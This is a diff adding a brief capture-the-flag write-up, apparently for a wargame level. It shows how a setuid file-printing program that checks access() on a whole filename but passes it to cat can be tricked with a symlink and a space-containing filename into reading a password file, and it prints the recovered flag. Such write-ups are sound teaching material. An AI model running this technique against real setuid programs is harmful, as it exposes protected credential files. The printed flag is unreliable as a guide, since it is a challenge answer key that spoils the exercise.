@@ -1,0 +1,15 @@
+# We get a printfile program
+# The program uses acces() and /bin/cat (see ltrace)
+# acces is called on the whole file, while /bin/cat treats files with a space
+# like two seperate files.
+
+use:
+mkdir /tmp/umphack
+cd /tmp/umphack
+ln -s /etc/leviathan_pass/leviathan3 /tmp/umphack/link
+touch /tmp/umphack/link\ text
+
+~/printfile 'link text'
+
+flag:
+Ahdiemoo1j
